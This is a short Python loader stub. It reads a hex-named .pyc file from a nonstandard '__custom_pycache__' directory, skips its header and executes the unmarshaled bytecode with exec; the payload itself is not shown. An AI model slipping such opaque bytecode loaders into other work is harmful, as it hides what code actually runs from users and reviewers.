
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'auxiliary_9ac3ee9f7c9d43aab4be2636d4410da9.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
